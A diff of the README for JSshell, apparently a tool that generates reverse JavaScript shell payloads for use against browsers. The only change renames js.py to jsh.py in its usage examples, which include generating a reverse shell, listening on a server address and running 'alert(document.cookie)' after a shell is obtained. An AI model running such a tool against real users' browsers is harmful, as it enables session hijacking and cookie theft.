@@ -33,11 +33,11 @@ new()
 #### Execute a command after get the shell:  `-c`
 
 #### Example usages:
-- `js.py`
-- `js.py -g`
-- `js.py -p 1234`
-- `js.py -s 48.586.1.23 -g`
-- `js.py -c "alert(document.cookie)" -w 10`
+- `jsh.py`
+- `jsh.py -g`
+- `jsh.py -p 1234`
+- `jsh.py -s 48.586.1.23 -g`
+- `jsh.py -c "alert(document.cookie)" -w 10`
 
 #### An example for running JSshell:
 This is a step-by-step example for how to use JSshell.
@@ -48,8 +48,8 @@ First we will generate a reverse JS shell payload and set the shell timeout is 2
 ~# whoami
 root
 ~# ls
-README.md   js.py
-~# python3 js.py -g -w 20
+README.md   jsh.py
+~# python3 jsh.py -g -w 20
     __
   |(_  _ |_  _  |  |
 \_|__)_> | |(/_ |  |
